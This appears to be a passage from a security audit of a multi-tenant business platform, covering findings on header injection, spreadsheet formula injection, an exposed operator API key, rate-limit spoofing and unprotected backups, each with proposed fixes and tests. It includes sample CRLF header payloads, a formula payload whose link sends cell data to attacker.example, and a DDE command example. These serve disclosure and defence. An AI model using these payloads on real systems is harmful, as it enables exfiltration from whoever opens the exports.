|---|---|
| **Severity** | Medium |
| **Status** | **KNOWN** — `SECURITY_HARDENING.md` §10.7. Extended here with empirical results the existing note does not have. |
| **Confidence** | CONFIRMED (both behaviours reproduced locally) |
| **Class** | Header injection / spoofing |
| **Locations** | `app/routers/docvault.py:644`, `app/routers/auditor_engagements.py:719`, `app/routers/asset_documents.py:356` |

#### What the existing note says

> §10.7 — "Document downloads echo a client-supplied MIME type, and
> `Content-Disposition` interpolates the original filename without escaping.
> `nosniff` plus `attachment` make this hard to exploit today, but neither is the
> actual fix."

Accurate. Two things to add.

#### Addition 1 — the `attachment` reasoning does not hold everywhere

`asset_documents.py:352` serves `inline`, not `attachment`. That is
[KUB-009](#kub-009).

#### Addition 2 — what the framework actually does (measured)

Tested against uvicorn 0.34.3 with httptools 0.8.0, the exact versions in
`uv.lock` (full commands in Appendix C):

| Payload in `original_filename` | Result |
|---|---|
| `a.pdf"\r\nX-Injected: yes\r\nSet-Cookie: a=b` | **Rejected** — `RuntimeError: Invalid HTTP header value.` → HTTP 500 |
| `a.pdf\nX-Injected: 1` | **Rejected** — same |
| `a.pdf" ; filename*=UTF-8''evil.html` | **Accepted** — header emitted verbatim |

Also confirmed with h11 directly (`LocalProtocolError: Illegal header value`), so
both of uvicorn's HTTP implementations reject CRLF.

**So there is no HTTP response splitting.** Two real consequences remain:

1. **Availability.** A filename containing a newline makes that document's
   download raise `RuntimeError` on every attempt — a permanent 500 with no
   recovery path through the UI. A user can brick their own upload, and an
   attacker can brick a shared one.
2. **Filename spoofing.** A bare `"` is a legal header character. RFC 6266 gives
   `filename*` precedence over `filename`, so
   `invoice.pdf" ; filename*=UTF-8''payroll.html` displays as `invoice.pdf` in
   the app but saves to disk as `payroll.html`. Combined with the unvalidated
   MIME type this is a credible internal phishing / drive-by vector.

#### Proposed fix

Covered by the `vault_file_response` helper in [KUB-009](#kub-009), which emits
RFC 6266-compliant headers with an ASCII-stripped `filename` and a percent-encoded
`filename*`. Additionally, sanitise at the point of storage so the bad value never
persists:

```python
# app/routers/docvault.py::handle_file_upload
import re
_UNSAFE_FILENAME = re.compile(r'[\x00-\x1f\x7f"\\/]')

def _safe_original_filename(name: str | None) -> str:
    """Keep the user's name for display, minus anything that breaks a header or
    a filesystem. Never used to build a path — see storage_path above — but it is
    echoed in Content-Disposition, which is enough reason to clean it."""
    cleaned = _UNSAFE_FILENAME.sub("_", (name or "unknown").strip()) or "unknown"
    return cleaned[:255]

    version = DocumentVersion(
        ...
        original_filename=_safe_original_filename(file.filename),
```

A backfill for existing rows is advisable:

```sql
UPDATE document_versions
SET original_filename = regexp_replace(original_filename, '[\x00-\x1f\x7f"\\/]', '_', 'g')
WHERE original_filename ~ '[\x00-\x1f\x7f"\\/]';
```

#### Effort

Small; ships with KUB-009.

---

<a name="kub-011"></a>
### KUB-011 — Excel formula injection in all generated exports

| | |
|---|---|
| **Severity** | Medium |
| **Status** | NEW |
| **Confidence** | CONFIRMED |
| **Class** | CSV/formula injection (CWE-1236) |
| **Locations** | `app/services/export_service.py:12-48`, `app/services/reporting/workbook.py`, consumers at `assets.py:445`, `sales.py:250`, `asset_reports.py:364,484`, `auditease.py:1679,1719,1882` |

#### What is wrong

```python
# app/services/export_service.py:26-43
    for row_idx, record in enumerate(records, start=2):
        for col_idx, col in enumerate(columns, start=1):
            val = record
            for part in col.field_path.split('.'):
                ...
            sheet.cell(row=row_idx, column=col_idx, value=val)
```

openpyxl assigns a cell's data type from the value: a string beginning with `=`
becomes a **formula**, not text. Every export therefore embeds tenant-supplied
strings as live formulas.

Reachable input fields include supplier names, asset descriptions, ledger account
names, custom-field values, sales record notes and KRA text — all free-text and
all user-writable.

#### Impact

An employee sets a supplier name to:

```
=HYPERLINK("https://attacker.example/?d="&CONCATENATE(A2:A50),"Click for details")
```

Every subsequent asset export contains a working exfiltration link. The classic
DDE variant (`=cmd|'/c calc'!A0`) requires the recipient to click through two
Excel warnings, so treat data exfiltration and phishing as the realistic outcome
rather than code execution.

The victim is whoever opens the workbook — typically an accountant or the
external auditor, i.e. exactly the people with the broadest data access.

#### Note on scope

This affects **exports**, not imports. `parse_and_import` uses
`openpyxl.load_workbook(..., data_only=True)` (`import_service.py:44`), which
reads cached values rather than formulas, so importing a hostile workbook does
not evaluate anything. That is correct as written.

#### Proposed fix

Escape at the single choke point where values are written:

```python
# app/services/export_service.py
# Excel treats a leading =, +, -, @ (and the two control characters below, which
# Excel strips before parsing) as the start of a formula. A tenant-supplied
# string must never become one, so it is prefixed with an apostrophe — which
# Excel renders as plain text and does not include in the cell value.
_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


def _neutralize(value):
    if isinstance(value, str) and value.startswith(_FORMULA_TRIGGERS):
        return "'" + value
    return value
```
```python
            sheet.cell(row=row_idx, column=col_idx, value=_neutralize(val))
```

Apply the same helper to the header row (`export_service.py:23`) and to
`app/services/reporting/workbook.py`, which builds the AuditEase and asset-report
workbooks on a separate path.

Consider also setting a defensive column type where the data is known to be
numeric, so a hostile string in a numeric column fails loudly rather than
silently becoming text.

#### Regression test

```python
@pytest.mark.parametrize("payload", ['=1+1', '+1', '-1', '@SUM(A1)', '\t=1+1',
                                     '=HYPERLINK("http://x","y")'])
def test_export_never_emits_a_live_formula(payload):
    buf = generate_xlsx([{"name": payload}], [ExportColumn("Name", "name")])
    wb = openpyxl.load_workbook(buf)          # NOT data_only — we want the raw type
    cell = wb.active.cell(row=2, column=1)
    assert cell.data_type != "f", f"{payload!r} was written as a formula"
    assert cell.value.startswith("'") or not cell.value.startswith(("=", "+", "-", "@"))
```

#### Effort

Very small — one helper, two call sites, one parametrised test.

---

<a name="kub-012"></a>
### KUB-012 — `INTERNAL_API_KEY` entered and stored in the browser

| | |
|---|---|
| **Severity** | Medium |
| **Status** | NEW |
| **Confidence** | CONFIRMED |
| **Class** | Secrets management / broken access control |
| **Locations** | `frontend/src/pages/owner/OwnerLeadsPage.tsx:25,47,58,93,116,178`, `app/routers/auth.py:53-64`, `app/routers/leads.py:29-38`, `gateway/modes/app.conf` |

#### What is wrong

The platform's master operator credential is typed into a form field in the SPA
and persisted in the browser:

```tsx
// frontend/src/pages/owner/OwnerLeadsPage.tsx:25
const [apiKey, setApiKey] = useState<string>(() => sessionStorage.getItem('kubera_owner_key') || '')
// :58
sessionStorage.setItem('kubera_owner_key', key)
// :178
placeholder="Enter INTERNAL_API_KEY..."
```

That single static string authorises all 7 internal endpoints:

| Endpoint | Effect |
|---|---|
| `POST /api/v1/auth/companies` | Create a company + admin, returns the activation key |
| `POST /api/v1/auth/companies/{id}/reissue-key` | Mint a new activation key |
| `GET /api/v1/auth/companies` | List every company and admin email on the platform |
| **`DELETE /api/v1/auth/companies/{id}`** | **Hard-delete a company: cascade-deletes every tenant row, then `shutil.rmtree` its vault directory** (`app/routers/auth.py:341-387`) |
| `GET /api/v1/owner/leads` | All inbound leads (names, emails, phone numbers) |
| `PATCH /api/v1/owner/leads/{id}/status` | Mutate lead state |
| `POST /api/v1/owner/leads/{id}/provision` | Provision a company, returns the activation key |

Properties that make this worse:

- **It is served on the public application domain.** `gateway/modes/app.conf`
  blocks `/api/` only from the *marketing* domain; from `app.<domain>` every
  internal endpoint is internet-reachable, guarded solely by the header.
- **No rate limit, no lockout, no alerting** ([KUB-003](#kub-003)).
- **No IP allowlist** at the edge.
- **It never rotates**, and rotating it means editing `.env` and restarting the
  whole stack.
- **Any XSS on the app origin steals it**, and there is no CSP.

The comparison check itself is correct — `secrets.compare_digest` in both
`app/routers/auth.py:58` and `leads.py:32`, and the key is validated for length and against
placeholders at startup (`config.py:110-116`). The problem is exposure, not
comparison.

#### Impact

One stolen header value permits deletion of every customer's data — database rows
and encrypted vault files both — with no second factor and no confirmation beyond
a name string the attacker can read from the same API.

#### Proposed fix

Ordered by effort; do at least 1 and 2.

**1. Restrict the internal endpoints at the edge.** They are operator tooling and
have no business being answerable from the public internet.

```nginx
# gateway/modes/app.conf — before the general /api/ location
location ^~ /api/v1/owner/ {
    allow 203.0.113.10;      # operator static IP / office range
    allow 10.8.0.0/24;       # VPN
    deny all;

    set $api_upstream api:8000;
    proxy_pass http://$api_upstream;
    proxy_http_version 1.1;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
}

location ^~ /api/v1/auth/companies {
    allow 203.0.113.10;
    allow 10.8.0.0/24;
    deny all;
    # ... same proxy block ...
}
```

Note `^~`, which stops the regex location from taking precedence, and note that
`allow`/`deny` evaluate `$remote_addr` — which is Caddy's address, not the
client's. Since Caddy pins `X-Forwarded-For` to the real client
(`Caddyfile:41`), use `realip` or match on the header:

```nginx
# gateway/nginx.conf — http context
set_real_ip_from 172.16.0.0/12;    # the docker `edge` network
real_ip_header X-Forwarded-For;
real_ip_recursive on;
```

**2. Require a second factor for destructive operations.** `DELETE /companies/{id}`
already asks for `confirm_name`, but the attacker can read the name from
`GET /companies`. Add a separate, out-of-band secret held only by the operator:

```python
# app/config.py
    # Second factor for irreversible operator actions (company hard delete).
    # Deliberately separate from INTERNAL_API_KEY so the day-to-day operator
    # console key cannot, on its own, destroy a tenant.
    DESTRUCTIVE_ACTION_KEY: str = ""
```
```python
# app/routers/auth.py::delete_company
    _require_internal_key(x_internal_api_key)
    settings = get_settings()
    if not settings.DESTRUCTIVE_ACTION_KEY or not x_destructive_action_key or \
       not secrets.compare_digest(x_destructive_action_key, settings.DESTRUCTIVE_ACTION_KEY):
        raise HTTPException(403, detail="A second confirmation key is required for this action")
```

**3. Move the operator console off the tenant origin.** The cleanest fix is to
stop having a browser page hold the key at all — make `list_leads.py` /
`create_company.py` (which already exist as CLI tools and already read `.env`) the
only interface, and delete `OwnerLeadsPage.tsx`. If the UI is wanted, host it on a
separate origin so tenant-origin XSS cannot reach its storage.

**4. Add a soft-delete grace period.** `purge_company` is irreversible the moment
it commits, and `shutil.rmtree` follows immediately (`app/routers/auth.py:377-378`). Consider
marking for deletion and purging after 7 days via the existing Celery beat
schedule, so a mistake or a compromise is recoverable.

**5. Log and alert.** None of the internal endpoints write an `ActivityLog` except
company creation. At minimum, log every internal-key call with the source IP.

#### Effort

Small for 1 and 5; medium for 2–4.

---

<a name="kub-013"></a>
### KUB-013 — Audit bucket silently downgrades `restricted` → `everyone`

| | |
|---|---|
| **Severity** | Medium |
| **Status** | NEW |
| **Confidence** | CONFIRMED |
| **Class** | Broken access control — security control silently reverted |
| **Locations** | `app/services/document_access.py:31-68`, `app/routers/docvault.py:74-105,247-291` |

#### What is wrong

```python
# app/services/document_access.py:51-68
    res = await db.execute(
        select(Bucket).where(and_(Bucket.company_id == company_id, Bucket.name == bucket_name))
    )
    bucket = res.scalar_one_or_none()
    if bucket:
        if bucket.visibility != BucketVisibility.everyone:
            bucket.visibility = BucketVisibility.everyone      # <- forced back
            await db.flush()
        return bucket
    bucket = Bucket(
        company_id=company_id,
        name=bucket_name,
        created_by=created_by,
        visibility=BucketVisibility.everyone,
    )
```

An admin who restricts the "Audit — FY25" bucket via
`PATCH /api/v1/docvault/buckets/{id}/access` has that decision **silently
reverted** the next time any audit attachment is uploaded — by either party,
including the auditor. The admin gets no error and no notification; the bucket
simply reopens.

Interaction with [KUB-001](#kub-001) makes it worse: because
`accessible_bucket_ids` (`docvault.py:82`) grants every non-admin access to
`everyone` buckets, and DocVault has no module gate, the audit attachments become
readable by **every user in the company** — including users with no DocVault
grant at all.

#### Why the code does this

The intent is legible: audit attachments must be visible to the company side of
the engagement, and `ensure_audit_bucket` can be called from an *auditor's*
request where there is no company user to attribute (hence
`created_by: Optional`, and the comment at `app/models/docvault.py:34-36`). Forcing
`everyone` is a blunt way to guarantee the company can see what its auditor
uploaded.

#### Proposed fix

Set the visibility on **creation only**, and never override an explicit
administrative decision:

```python
# app/services/document_access.py
async def ensure_audit_bucket(db, company_id, created_by=None, engagement_id=None) -> Bucket:
    ...
    bucket = res.scalar_one_or_none()
    if bucket:
        # Do NOT touch visibility. If an admin restricted this bucket, that is a
        # deliberate access decision and reverting it silently re-exposes audit
        # attachments to the whole company. Access for the people who need it is
        # granted per-document instead (grant_auditor_read /
        # grant_document_access_to_auditors), which is already how the auditor side
        # works.
        return bucket
    bucket = Bucket(
        company_id=company_id,
        name=bucket_name,
        created_by=created_by,
        visibility=BucketVisibility.everyone,   # default for a NEW bucket only
    )
```

Then make sure the company side still sees what it needs. Two options:

**(a) Grant the engagement's participants explicitly** when a restricted audit
bucket is in play — mirroring `grant_document_access_to_auditors`:

```python
async def ensure_company_participants_can_read(db, company_id, bucket_id) -> None:
    """When the audit bucket is restricted, the users who actually work the
    engagement still need access. Grant them, rather than reopening the bucket."""
    if (await _bucket_visibility(db, bucket_id)) != BucketVisibility.restricted:
        return
    user_ids = (await db.execute(
        select(CompanyUser.id).where(
            CompanyUser.company_id == company_id,
            CompanyUser.deleted_at.is_(None),
            CompanyUser.is_active.is_(True),
            or_(CompanyUser.role == UserRole.admin,
                CompanyUser.accessible_modules.contains(["auditease"])),
        )
    )).scalars().all()
    existing = set((await db.execute(
        select(BucketAccessGrant.company_user_id).where(BucketAccessGrant.bucket_id == bucket_id)
    )).scalars().all())
    for uid in user_ids:
        if uid not in existing:
            db.add(BucketAccessGrant(bucket_id=bucket_id, company_user_id=uid))
```

**(b) Warn instead of revert** — allow the restriction, and surface a warning in
the bucket-access UI when the bucket is an engagement bucket. Simpler, and puts
the decision where it belongs.

Also worth adding: mark system buckets so they cannot be renamed into collision
with a user bucket. `ensure_audit_bucket` matches on `Bucket.name`, so a user who
renames their own bucket to `Audit - FY25` (rename is admin-only,
`app/routers/docvault.py:234`) causes audit attachments to land in it. A boolean
`is_system` column, or matching on `engagement_id` instead of a name string,
removes that class of problem:

```python
op.add_column("buckets", sa.Column("is_system", sa.Boolean(), nullable=False, server_default="false"))
op.add_column("buckets", sa.Column("engagement_id", sa.UUID(), nullable=True))
op.create_unique_constraint("uq_buckets_engagement", "buckets", ["engagement_id"])
```

#### Regression test

```python
async def test_restricted_audit_bucket_stays_restricted(db, company, engagement, admin):
    bucket = await ensure_audit_bucket(db, company.id, admin.id, engagement.id)
    bucket.visibility = BucketVisibility.restricted
    await db.commit()
    await ensure_audit_bucket(db, company.id, admin.id, engagement.id)   # second upload
    await db.refresh(bucket)
    assert bucket.visibility is BucketVisibility.restricted
```

#### Effort

Small for the revert-removal; medium if you add (a) or the `is_system` columns.

---

<a name="kub-014"></a>
### KUB-014 — Rate-limit key trusts client-supplied `X-Forwarded-For`

| | |
|---|---|
| **Severity** | Medium |
| **Status** | NEW |
| **Confidence** | CONFIRMED (code path); exploitation requires host-level access or a configuration change |
| **Class** | Insufficient anti-automation / trust boundary |
| **Locations** | `app/rate_limit.py:24-29,41-53`, `Caddyfile:31-42`, `docker-compose.yml:90-91`, `frontend/nginx.conf:39-46`, `app/routers/leads.py:57` |

#### What is wrong

```python
# app/rate_limit.py:24-29
def _client_ip(request: Request) -> str:
    # Honor a proxy-set forwarded header when present (app runs behind Caddy).
    fwd = request.headers.get("x-forwarded-for")
    if fwd:
        return fwd.split(",")[0].strip()
    return request.client.host if request.client else "unknown"
```

The header is trusted unconditionally, and the **left-most** entry — the one a
client controls — becomes the rate-limit bucket. An attacker who can reach the
API without traversing Caddy sends a fresh `X-Forwarded-For` per request and
never shares a bucket, defeating login and activation throttling entirely.

#### What currently mitigates it

The Caddyfile pins the header, and the existing comment shows the risk was
considered:

```
# Caddyfile:31-42
	reverse_proxy gateway:80 {
		# Set, not append. Caddy 2.11 already replaces X-Forwarded-For for
		# untrusted peers, which is why app/rate_limit.py taking the first entry
		# is currently safe — but that is a framework default, not a guarantee.
		header_up X-Forwarded-For {remote_host}
```

The gateway then appends its own hop (`$proxy_add_x_forwarded_for`), producing
`<real client>, <caddy>`, and `split(",")[0]` correctly reads the client. **For
traffic through Caddy, this is right.**

#### Why it is still a finding

1. **A second path to the API exists.** `docker-compose.yml:90-91` publishes
   the API on the host loopback:
   ```yaml
       ports:
         - "127.0.0.1:8000:8000"
   ```
   Anything on the host — another container with host networking, a co-tenant
   process, a compromised sidecar, an SSRF in unrelated software on the box —
   reaches `POST /api/v1/auth/company/login` directly with a spoofed header and
   unlimited attempts. `SECURITY_HARDENING.md` §9 already warns about "other
   hosts on the box"; this is a concrete consequence.
2. **A third path exists in the frontend container.** `frontend/nginx.conf:39-46`
   proxies `/api/` to `api:8000` and sets **no** `X-Forwarded-For` at all. That
   route is not currently used (`gateway/modes/app.conf` sends `/api/` straight
   to `api`), but if it ever were, every user would share one bucket keyed on the
   nginx container IP.
3. **A CDN in front changes the semantics**, as the Caddyfile note says.
4. **Defence in depth belongs in the consumer.** The application should not
   depend on an edge configuration it cannot verify at runtime.

#### Related: the limiter fails open, silently

```python
# app/rate_limit.py:51-53
    except Exception:
        # Redis unreachable — fail open.
        return
```

Redis runs `--maxmemory 200mb --maxmemory-policy noeviction`
(`docker-compose.yml:62`), so once it is full it **rejects writes** — `INCR`
raises, and every rate limit disappears with no log line anywhere.

#### Related: the leads endpoint records the wrong IP

```python
# app/routers/leads.py:57
    client_ip = request.client.host if request.client else "unknown"
...
# :75
        ip_address=client_ip,
```

Behind Caddy → gateway, `request.client.host` is the **gateway container's**
address. Every lead row records the same internal IP, so the anti-abuse field is
useless. (The rate limit itself is fine — `enforce_rate_limit` separately calls
`_client_ip`, which does read the header.)

#### Proposed fix

**1. Make the trusted-proxy boundary explicit and configurable:**

```python
# app/config.py
    # Networks permitted to set X-Forwarded-For. Only addresses in these ranges
    # have their forwarded header believed; anyone else is rate-limited by their
    # real peer address. Empty means "trust nothing", which is the safe default
    # for a directly-exposed API.
    TRUSTED_PROXY_CIDRS: str = "172.16.0.0/12,192.168.0.0/16,10.0.0.0/8"

    def trusted_proxies(self) -> list[ipaddress.IPv4Network | ipaddress.IPv6Network]:
        return [
            ipaddress.ip_network(c.strip(), strict=False)
            for c in self.TRUSTED_PROXY_CIDRS.split(",") if c.strip()
        ]
```

```python
# app/rate_limit.py
def _client_ip(request: Request) -> str:
    """The address a rate-limit bucket is keyed on.

    X-Forwarded-For is only believed when the immediate peer is a proxy we run.
    Caddy pins the header to the real client (see Caddyfile), but the API is also
    published on 127.0.0.1:8000, and a caller arriving that way must not be able
    to mint a fresh bucket per request by inventing a header.
    """
    peer = request.client.host if request.client else None
    if peer is None:
        return "unknown"
    try:
        peer_ip = ipaddress.ip_address(peer)
    except ValueError:
        return peer

    if not any(peer_ip in net for net in get_settings().trusted_proxies()):
        return str(peer_ip)          # untrusted peer: ignore the header entirely

    fwd = request.headers.get("x-forwarded-for")
    if not fwd:
        return str(peer_ip)
    # Right-most entry that is NOT one of our own proxies is the real client.
    for candidate in reversed([p.strip() for p in fwd.split(",") if p.strip()]):
        try:
            ip = ipaddress.ip_address(candidate)
        except ValueError:
            continue
        if not any(ip in net for net in get_settings().trusted_proxies()):
            return str(ip)
    return str(peer_ip)
```

Note this walks from the **right**, which is the correct direction: entries to the
left of the first trusted hop are attacker-supplied.

**2. Make fail-open observable** (see [KUB-003](#kub-003)).

**3. Fix the lead IP record** — reuse the same helper:

```python
# app/routers/leads.py
from app.rate_limit import client_ip_for_audit   # rename _client_ip and export it
    client_ip = client_ip_for_audit(request)
```
and simplify the rate-limit identifier, which currently redundantly embeds the IP
inside the identifier (`f"{client_ip}:{normalized_email}"`) when
`enforce_rate_limit` already prefixes the key with the IP:
```python
    await enforce_rate_limit(request, "lead_signup", normalized_email,
                             limit=3, window_seconds=600)
```

**4. Set the header in the frontend nginx too**, so the unused path is not a
latent trap:

```nginx
# frontend/nginx.conf
    location /api/ {
        set $api_upstream api:8000;
        proxy_pass http://$api_upstream;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;   # <- add
        proxy_set_header X-Forwarded-Proto $scheme;                    # <- add
        ...
    }
```

**5. Consider dropping the published API port.** The compose comment
(`docker-compose.yml:87-89`) justifies it for maintenance-mode bypass prevention
and as an `ops/kubera-import.sh` readiness probe. Both work through
`docker compose exec` instead — and `kubera-import.sh:119` already tries
`docker compose exec` first, falling back to `curl`. Removing the port closes
this path and the `/docs` exposure ([KUB-L08](#kub-l08)) at once.

#### Regression test

```python
def test_forwarded_header_ignored_from_untrusted_peer(monkeypatch):
    req = make_request(peer="203.0.113.9", headers={"x-forwarded-for": "1.2.3.4"})
    monkeypatch.setenv("TRUSTED_PROXY_CIDRS", "172.16.0.0/12")
    assert _client_ip(req) == "203.0.113.9"

def test_real_client_extracted_from_right_of_trusted_hops():
    req = make_request(peer="172.18.0.5",
                       headers={"x-forwarded-for": "9.9.9.9, 203.0.113.7, 172.18.0.4"})
    assert _client_ip(req) == "203.0.113.7"
```

The second test encodes the important property: a client that pre-seeds
`9.9.9.9` cannot displace the address the edge recorded.

#### Effort

Small — one helper rewrite plus config.

---

<a name="kub-015"></a>
### KUB-015 — Backups unencrypted, unreplicated, and colocated with the data

| | |
|---|---|
| **Severity** | Medium |
| **Status** | NEW (`SECURITY_HARDENING.md` §4.9 covers *whether backups run*, not how they are protected) |
| **Confidence** | CONFIRMED |
| **Class** | Cryptographic failure / insufficient resilience (OWASP A02) |
| **Locations** | `app/worker.py:75-158`, `docker-compose.yml:115-117,153-157,193-195,291-298`, `app/config.py:62-66` |

#### What is wrong

```python
# app/worker.py:107-139
    db_backup_file = os.path.join(backup_dir, f"db_backup_{timestamp}.dump")
    vault_backup_file = os.path.join(backup_dir, f"vault_backup_{timestamp}.tar.gz")
    ...
    result = subprocess.run(["pg_dump", *args, "-Fc", "-f", db_backup_file], ...)
    ...
    result = subprocess.run(["tar", "-czf", vault_backup_file, "-C", parent, name], ...)
```

Five distinct problems:

1. **No encryption.** `pg_dump -Fc` is compressed, not encrypted. It contains
   every tenant's plaintext business data — company profiles with CIN/PAN/GSTIN,
   user records with email addresses and bcrypt hashes, trial balances, asset
   registers, activity logs, lead contact details, and the *wrapped* company
   KEKs. The document ciphertext in the tarball stays protected by
   `ROOT_MASTER_KEK` (which is not in the backup), so documents are safe — but the
   structured data, which is most of the product's sensitive content, is not.
2. **No off-host copy.** `backup_data` is a local Docker volume on the same host
   and the same disk as `pgdata` and `vault_data`. A disk failure, a host
   compromise, or a mistaken `docker volume prune` loses the data *and* its
   backup. This is not a backup; it is a second copy in the same failure domain.
3. **No integrity or restore verification.** The only check is
   non-zero size (`worker.py:122-123`). Nothing verifies the dump is restorable.
   `ops/kubera-import.sh` has real verification (row counts, vault file counts,
   KEK fingerprint) but that runs on *migration*, not nightly.
4. **No free-space guard, and age-only retention.** The docstring
   (`worker.py:77-80`) correctly identifies disk-full as the failure mode, but
   the remedy is age-based:
   ```python
   # app/worker.py:81-93
   cutoff = time.time() - retention_days * 86400
   ```
   With `BACKUP_RETENTION_DAYS = 14` and a full vault tarball every night, steady-state
   usage is ~14× the vault size, on a host sized for 4 GB total container memory.
   For a 2 GB vault that is 28 GB of backups. There is no check that the write
   will fit, so the first symptom is Postgres failing to write — exactly what the
   comment warns about.
5. **`ROOT_MASTER_KEK` is handed to `pg_dump`.** `env={**os.environ, **pg_env}`
   (`worker.py:116`) passes the entire environment, including the root key, to a
   subprocess that has no use for it. Minor, but gratuitous.

#### Impact

The at-rest encryption story has a hole: a stolen backup file yields all
structured tenant data with no key required. And the DR story does not survive the
most likely disaster, because the backup shares the disk it protects against.

#### Proposed fix

**1. Encrypt the artefacts.** `age` is the least-ceremony option and needs only a
public key on the server — so a compromised host cannot decrypt its own backups:

```python
# app/worker.py
def _encrypt_to(path: str, recipient: str) -> str:
    """Encrypt `path` in place to `path.age` using a public recipient key.

    Only the public key lives on this host, so an attacker who compromises the
    server can create backups but cannot read the existing ones.
    """
    out = f"{path}.age"
    result = subprocess.run(["age", "-r", recipient, "-o", out, path],
                            capture_output=True, text=True)
    if result.returncode != 0:
        raise RuntimeError(f"age encryption failed: {result.stderr.strip()}")
    os.remove(path)
    return out
```
```python
    recipient = settings.BACKUP_AGE_RECIPIENT
    if recipient:
        db_backup_file = _encrypt_to(db_backup_file, recipient)
        vault_backup_file = _encrypt_to(vault_backup_file, recipient)
```
Add `age` to the `Dockerfile` apt list, and to config:
```python
    # age public key (age1...) that nightly backups are encrypted to. The matching
    # private key must NOT be on this server. Empty disables encryption, which is
    # only appropriate for local development.
    BACKUP_AGE_RECIPIENT: str = ""
```

**2. Ship them off-host.** Any of: `rclone` to object storage,
`restic`/`borg` to a remote repository (both give deduplication, which solves
problem 4 for the vault tarball as well), or `rsync` to a separate machine. This
is the single most important item in this finding. `restic` is the best fit
because it deduplicates the vault, encrypts natively (removing the need for step
1), and has a `check` subcommand for step 3.

**3. Verify restorability.** At minimum assert the dump's table of contents is
readable:

```python
    probe = subprocess.run(["pg_restore", "--list", db_backup_file],
                           capture_output=True, text=True)
    if probe.returncode != 0 or "company_users" not in probe.stdout:
        raise RuntimeError(f"backup is not restorable: {probe.stderr.strip()[:400]}")
```
and schedule a genuine monthly restore into a scratch database.

**4. Add a free-space guard and a size ceiling:**

```python
def _assert_space_for_backup(backup_dir: str, vault_path: str) -> None:
    """Refuse to start a backup that cannot fit. Filling the disk takes Postgres
    down with it, which is a worse outcome than a missing night's backup."""
    needed = _dir_size(vault_path) * 2          # tarball + headroom
    free = shutil.disk_usage(backup_dir).free
    if free < needed:
        raise RuntimeError(
            f"insufficient disk for backup: need ~{needed // 2**20} MiB, {free // 2**20} MiB free"
        )
```
and prune by total size as well as age:
```python
def prune_old_backups(backup_dir, retention_days, max_total_bytes: int | None = None) -> list[str]:
    ...  # existing age pass, then:
    if max_total_bytes:
        files = sorted(_all_backups(backup_dir), key=os.path.getmtime)   # oldest first
        total = sum(os.path.getsize(f) for f in files)
        while total > max_total_bytes and len(files) > 1:   # never delete the last one
            victim = files.pop(0)
            total -= os.path.getsize(victim)
            os.remove(victim)
            removed.append(victim)
```

**5. Stop leaking the environment to `pg_dump`:**

```python
        env={"PATH": os.environ.get("PATH", "/usr/bin:/bin"), **pg_env},
```

**6. Add a task lock and time limit** so overlapping runs cannot both tar the
vault ([KUB-L21](#kub-l21)).

**7. Alert on failure.** `nightly_backup` raises, which Celery records — but
nothing surfaces it. Wire a failure notification (the email infrastructure already
exists) so a silently-failing backup is noticed before it is needed.

#### Regression test

`unit_tests/test_backup_task.py` already exists; extend it:

```python
def test_backup_is_encrypted_when_recipient_configured(monkeypatch, tmp_path): ...
def test_backup_refuses_when_disk_is_full(monkeypatch, tmp_path): ...
def test_prune_respects_total_size_ceiling(tmp_path): ...
def test_pg_dump_does_not_receive_root_master_kek(monkeypatch): ...
```

#### Effort

Medium. Item 2 (off-host) is the priority and is mostly ops configuration rather
than code.

---

<a name="kub-016"></a>
### KUB-016 — Migration bundle ships ciphertext and its root key together

| | |
|---|---|
| **Severity** | Medium |
| **Status** | NEW |
| **Confidence** | CONFIRMED |
| **Class** | Cryptographic failure / secrets management (OWASP A02) |
| **Locations** | `ops/kubera-export.sh:72-84`, `ops/kubera-import.sh:83,160-166`, `ops/kubera-migrate.sh:88-93`, `ops/lib.sh` |

#### What is wrong

`ops/kubera-export.sh` builds a single directory containing all three of:

```bash
# ops/kubera-export.sh
  chmod 700 "$BUNDLE"                                   # :45
  ... > "$BUNDLE/vault.tar.gz"                          # :78  every encrypted document
  cp "$PWD/.env" "$BUNDLE/env"                          # :83  ROOT_MASTER_KEK
  chmod 600 "$BUNDLE/env"                               # :84
```

plus the Postgres dump and a manifest. The `.env` copy contains:

| Secret | Consequence if exposed |
|---|---|
| `ROOT_MASTER_KEK` | Unwraps every company KEK → every DEK → **every document in the vault** |
| `JWT_SECRET_KEY` | Forge a token for any user or auditor, on the live system |
| `INTERNAL_API_KEY` | Create/delete any company ([KUB-012](#kub-012)) |
| `POSTGRES_PASSWORD`, `REDIS_PASSWORD` | Direct data-tier access |
| `SMTP_PASSWORD` | Send mail as the platform |

So the bundle collapses the entire envelope-encryption design into one artefact:
the ciphertext and the key that opens it, in the same directory. The
`SECURITY_HARDENING.md` §6 warning that losing `ROOT_MASTER_KEK` means losing the
vault has an unstated corollary — *possessing* the bundle means possessing the
vault.

The bundle persists at rest on **both** machines (`--keep-bundle` keeps it
deliberately; otherwise cleanup depends on the script completing), and its name
matches `kubera-migration-*` in `.gitignore`, i.e. it is created inside the repo
working directory.

#### What is already right

Worth stating, because the file permissions are not the problem:

- `chmod 700` on the directory and `600` on the env copy.
- Transfer is `rsync` over SSH with a throwaway ed25519 key that is removed in an
  `EXIT` trap (`kubera-migrate.sh:50-58`), with a warning if removal fails.
- A manifest with row counts, vault file count, and a KEK fingerprint, verified on
  import (`kubera-import.sh:126-145`) — genuinely good integrity checking.

The gap is **confidentiality of the artefact at rest**, not transit or integrity.

#### Proposed fix

**Option 1 (recommended) — encrypt the whole bundle to a key held off both hosts:**

```bash
# ops/kubera-export.sh — after the bundle is assembled
if [ -n "${KUBERA_BUNDLE_RECIPIENT:-}" ]; then
  need_cmd age
  log "encrypting bundle to $KUBERA_BUNDLE_RECIPIENT..."
  tar czf - -C "$(dirname "$BUNDLE")" "$(basename "$BUNDLE")" \
    | age -r "$KUBERA_BUNDLE_RECIPIENT" -o "$BUNDLE.tar.gz.age"
  rm -rf "$BUNDLE"
  log "bundle: $BUNDLE.tar.gz.age  (decrypt with: age -d -i <identity> ...)"
else
  warn "KUBERA_BUNDLE_RECIPIENT not set — bundle contains .env in PLAINTEXT alongside the vault."
  warn "Anyone who obtains this directory can decrypt every tenant document. See KUB-016."
fi
```

with the matching decrypt step in `kubera-import.sh`. The private key lives on the
